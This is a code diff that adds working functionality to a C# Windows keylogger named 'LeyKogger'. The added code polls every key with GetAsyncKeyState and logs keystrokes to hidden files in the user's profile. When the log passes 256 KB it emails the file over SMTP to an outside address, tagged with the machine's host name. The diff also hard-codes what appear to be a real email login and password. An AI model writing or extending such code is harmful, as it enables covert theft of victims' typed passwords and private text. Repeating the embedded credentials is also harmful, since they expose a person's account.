@@ -13,28 +13,41 @@ namespace LeyKogger
 {
     static class Program
     {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
         private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
-        private static List<Keys> keys = new List<Keys>();
+        private static List<Keys> keys = new();
 
         private static void Initiate()
         {
-
+            if (!File.Exists(path))
+            {
+                File.Create(path);
+                File.SetAttributes(path, FileAttributes.Hidden);
+            }
+            if (!File.Exists(path + ".archive"))
+            {
+                File.Create(path + ".archive");
+                File.SetAttributes(path + ".archive", FileAttributes.Hidden);
+            }
         }
-
-        [DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i);
 
         private static void ReadKeyboard()
         {
-            for (short x = 0; x < 256; x++)
-                if (GetAsyncKeyState(x) != 0 && (Keys)x != Keys.None)
+            for (short x = 0; x < 256; ++x)
+                if (GetAsyncKeyState(x) != 0)
                     keys.Add((Keys)x);
+        }
+
+        private static int BytesCount(string path)
+        {
+            return (File.ReadAllBytes(path)).Length;
         }
 
         static void Main()
         {
             string buffer = "";
-            int state;
+            Initiate();
 
             while (true)
             {
@@ -42,42 +55,47 @@ namespace LeyKogger
                 foreach (Keys key in keys)
                 {
                     if (key == Keys.Space) { buffer += " "; continue; }
-                    if (key == Keys.LButton && key == Keys.RButton && key == Keys.MButton) { continue; }
+                    if (key == Keys.Enter) { buffer += "\r\n"; continue; }
+                    if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) continue;
 
                     buffer += key.ToString();
                 }
 
-                File.AppendAllText(path, buffer);
+                if (buffer.Length > 0)
+                    File.AppendAllText(path, buffer);
                 buffer = "";
                 keys.Clear();
+                if (BytesCount(path) > 256 * 1024)
+                {
+                    buffer += SendMail(path);
+                    File.AppendAllText(path + ".archive", File.ReadAllText(path));
+                    File.WriteAllText(path, string.Empty);
+                }
                 Thread.Sleep(100);
             }
-
-            /*while (true)
-            {
-                Thread.Sleep(75);
-                for (short i = 0; i < 256; i++)
-                {
-                    state = GetAsyncKeyState(i);                    
-                    if (state != 0)
-                    {
-                        buffer += ((Keys)i).ToString();
-                        //buffer += (char)(state >> 8);
-                        if (buffer.Length > 10)
-                        {
-                            File.AppendAllText(path, buffer);
-                            buffer = "";                            
-                        }
-                        //nextState = state;
-                        state = 0;
-                    }   
-                }
-            }*/
         }
 
-        private static void SendMail()
+        private static string SendMail(string filePath)
         {
-
+            MailMessage message = new MailMessage("marekwork@hotmail.com", "mbarycki@uni.opole.pl");
+            message.Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName();
+            message.Attachments.Add(new Attachment(filePath));
+            using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
+            {
+                client.EnableSsl = true;
+                client.Port = 587;
+                client.Timeout = 5000;
+                client.Credentials = new NetworkCredential("marekwork@hotmail.com", "4love4law");
+                try
+                {
+                    client.Send(message);
+                }
+                catch (Exception ex)
+                {
+                    return ex.Message;
+                }
+                return string.Empty;
+            }
         }
     }
 }
